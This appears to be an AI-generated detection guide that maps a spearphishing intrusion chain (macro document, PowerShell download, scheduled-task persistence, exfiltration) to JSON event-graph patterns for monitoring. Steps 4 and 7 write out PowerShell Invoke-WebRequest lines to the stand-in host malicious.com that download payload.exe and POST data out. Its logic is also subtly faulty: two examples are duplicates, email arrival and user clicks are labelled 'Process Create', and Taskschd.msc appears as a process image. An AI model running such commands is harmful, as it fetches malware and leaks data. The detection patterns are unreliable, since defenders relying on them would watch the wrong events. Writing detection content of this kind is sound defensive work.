<output>
1. **Identify Email Delivery via Spearphishing**  
   - Monitor for events where the `srcNode` is an email application (e.g., Outlook) and the `dstNode` is an email with a suspicious "From" address (e.g., "admin@338") and an attachment named "Invoice.docx".  
   - Set the `relation` to "Process Create" for the email application process.  
   - Example:  
     ```json
     {
       "srcNode": {
         "Name": "Outlook",
         "Type": "Process"
       },
       "dstNode": {
         "Name": "Invoice.docx",
         "Type": "File"
       },
       "relation": "Process Create"
     }
     ```

2. **Identify User Interaction with Attachment**  
   - Monitor for events where the `srcNode` is the Outlook process and the user action involves clicking on an attachment and enabling macros.  
   - Set the `relation` to "Process Create" for the Outlook process.  
   - Example:  
     ```json
     {
       "srcNode": {
         "Name": "Outlook",
         "Type": "Process"
       },
       "dstNode": {
         "Name": "Invoice.docx",
         "Type": "File"
       },
       "relation": "Process Create"
     }
     ```

3. **Identify Execution of Malicious Macro**  
   - Monitor for events where the `srcNode` is Microsoft Word and the `dstNode` is a process spawned from Word that executes scripts or downloads files.  
   - Set the `relation` to "Process Create" for the Word process.  
   - Example:  
     ```json
     {
       "srcNode": {
         "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
         "Type": "Process"
       },
       "dstNode": {
         "Image": "C:\\Windows\\System32\\cmd.exe",
         "Type": "Process"
       },
       "relation": "Process Create"
     }
     ```

4. **Identify Payload Download via PowerShell**  
   - Monitor for events where the `srcNode` is PowerShell and the `dstNode` is a command that downloads an executable from a suspicious URL.  
   - Set the `relation` to "Process Create" for the PowerShell process.  
   - Example:  
     ```json
     {
       "srcNode": {
         "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         "Cmdline": "Invoke-WebRequest -Uri http://malicious.com/payload.exe -OutFile C:\\Users\\User\\Downloads\\payload.exe",
         "Type": "Process"
       },
       "dstNode": {
         "Name": "payload.exe",
         "Type": "File"
       },
       "relation": "Process Create"
     }
     ```

5. **Identify Execution of Malicious Payload**  
   - Monitor for events where the `srcNode` is Windows Explorer and the `dstNode` is the execution of the downloaded executable named "payload.exe" from the Downloads folder.  
   - Set the `relation` to "Process Create" for the Windows Explorer process.  
   - Example:  
     ```json
     {
       "srcNode": {
         "Image": "C:\\Windows\\explorer.exe",
         "Type": "Process"
       },
       "dstNode": {
         "Image": "C:\\Users\\User\\Downloads\\payload.exe",
         "Type": "Process"
       },
       "relation": "Process Create"
     }
     ```

6. **Identify Establishing Persistence via Task Scheduler**  
   - Monitor for events where the `srcNode` is the Task Scheduler and the `dstNode` is a new scheduled task that executes unusual commands or points to suspicious executables.  
   - Set the `relation` to "Process Create" for the Task Scheduler process.  
   - Example:  
     ```json
     {
       "srcNode": {
         "Image": "C:\\Windows\\System32\\Taskschd.msc",
         "Type": "Process"
       },
       "dstNode": {
         "Name": "malicious_task",
         "Type": "Process"
       },
       "relation": "Process Create"
     }
     ```

7. **Identify Data Exfiltration via PowerShell**  
   - Monitor for events where the `srcNode` is PowerShell and the `dstNode` is an outbound connection to a known malicious domain with a command that sends data.  
   - Set the `relation` to "TCP Send" for the PowerShell process.  
   - Example:  
     ```json
     {
       "srcNode": {
         "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         "Cmdline": "Invoke-WebRequest -Uri http://malicious.com/exfiltrate -Method POST -Body $data",
         "Type": "Process"
       },
       "dstNode": {
         "Dstaddress": "malicious.com",
         "Port": 80,
         "Type": "Network"
       },
       "relation": "TCP Send"
     }
     ```
</output>